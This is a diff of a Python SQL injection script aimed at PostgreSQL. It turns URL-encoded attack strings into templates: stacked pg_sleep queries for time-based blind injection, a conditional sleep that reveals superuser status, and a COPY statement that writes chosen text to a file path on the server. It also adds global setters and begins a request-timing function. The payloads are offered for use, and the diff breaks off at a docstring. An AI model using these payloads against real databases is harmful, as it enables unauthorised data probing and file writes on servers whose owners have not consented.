@@ -16,13 +16,39 @@ import base64
 import time
 
 # Postgress SQLI
-TIME_SQLI = ";select+pg_sleep(10);"																					# Sleeps for 10 seconds
-IS_SUPERUSER = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"		# Sleeps for 10 seconds if superuser
-COPY_TO_FILE = ";COPY+(SELECT+$$hacking$$)+to+$$c:\\hacking.txt$$;--+"												# Echos 'hacking' into C:\hacking.txt
+PG_SLEEP = ";select+pg_sleep({num});"																					# Sleeps for num seconds
+PG_IS_SUPERUSER = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep({num})+end;--+"		# Sleeps for num seconds if superuser
+PG_COPY_TO_FILE = ";COPY+(SELECT+$${string}$$)+to+$${path}\\{file}$$;--+"												# Echos 'string' into path\file
 
-import time
-import requests
+# SQLi Constants
+NUM = 0
+STRING = 'Hello World!'
+Path = 'C:\\'
 
+# Setters
+def set_num(value):
+    global NUM
+    NUM = value
+
+def set_string(value):
+    global STRING
+    STRING = value
+
+def set_file(value):
+    global Path
+    Path = value
+
+# Getters
+def get_num():
+    return NUM
+
+def get_string():
+    return STRING
+
+def get_path():
+    return Path
+
+# Blind SQL functions
 def check_request_time(url, string, max_time, proxy=None):
     """
     Performs a GET request on the concatenated URL and string, and checks if the response time exceeds max_time.
